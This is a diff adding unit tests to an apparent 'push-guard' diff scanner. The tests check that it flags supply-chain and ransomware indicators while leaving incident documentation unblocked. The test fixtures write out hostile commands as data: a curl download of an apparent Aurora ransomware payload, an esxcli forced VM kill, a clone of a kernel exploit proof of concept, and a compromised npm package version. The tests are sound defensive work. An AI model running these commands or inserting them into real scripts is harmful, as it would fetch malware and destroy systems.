@@ -228,6 +228,62 @@ class PushGuardTests(unittest.TestCase):
 
         self.assertEqual([], findings)
 
+    def test_scan_diff_blocks_trinitite_affected_version(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/package.json b/package.json",
+                "--- a/package.json",
+                "+++ b/package.json",
+                "@@ -1,0 +1,1 @@",
+                "+\"@7nohe/openapi-react-query-codegen\": \"3.0.4\"",  # push-guard: ignore
+            ]
+        )
+        findings = _scan_diff(diff_text)
+        self.assertTrue(any(f.rule_id == "workflow.trinitite_compromised_npm_version" for f in findings))
+
+    def test_scan_diff_blocks_trinitite_comment_publish_trigger(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/.github/workflows/release.yml b/.github/workflows/release.yml",
+                "--- a/.github/workflows/release.yml",
+                "+++ b/.github/workflows/release.yml",
+                "@@ -1,0 +1,1 @@",
+                "+if: github.event.comment.body == 'npm publish'",  # push-guard: ignore
+            ]
+        )
+        findings = _scan_diff(diff_text)
+        self.assertTrue(any(f.rule_id == "workflow.trinitite_comment_publish_trigger" for f in findings))
+
+    def test_scan_diff_blocks_aurora_and_public_kernel_exploit_artifacts(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/scripts/deploy.sh b/scripts/deploy.sh",
+                "--- a/scripts/deploy.sh",
+                "+++ b/scripts/deploy.sh",
+                "@@ -1,0 +1,3 @@",
+                "+curl -O https://pub-c057b7d0b24944a29e381ce9ea22a2f1.r2.dev/xu4gid0t8er3.out",  # push-guard: ignore
+                "+esxcli vm process kill --type=force --world-id=42",  # push-guard: ignore
+                "+git clone https://github.com/NebuSec/CyberMeowfia/tree/main/Linux-CVE-2026-52924",  # push-guard: ignore
+            ]
+        )
+        rule_ids = {finding.rule_id for finding in _scan_diff(diff_text)}
+        self.assertIn("workflow.aurora_ransomware_download", rule_ids)
+        self.assertIn("workflow.aurora_esxi_vm_kill", rule_ids)
+        self.assertIn("workflow.public_linux_kernel_lpe_poc", rule_ids)
+
+    def test_scan_diff_keeps_incident_documentation_non_blocking(self):
+        diff_text = "\n".join(
+            [
+                "diff --git a/docs/september-threats.md b/docs/september-threats.md",
+                "--- a/docs/september-threats.md",
+                "+++ b/docs/september-threats.md",
+                "@@ -1,0 +1,2 @@",
+                "+Aurora hash a4af136d159a8eb96b54924fa80355ca52874913301300f55af7d67ae97edcfe",  # push-guard: ignore
+                "+Research source NebuSec/CyberMeowfia/tree/main/Linux-CVE-2026-52924",  # push-guard: ignore
+            ]
+        )
+        self.assertEqual([], _scan_diff(diff_text))
+
     def test_scan_diff_blocks_hades_pypi_pth_bun_loader(self):
         diff_text = "\n".join(
             [
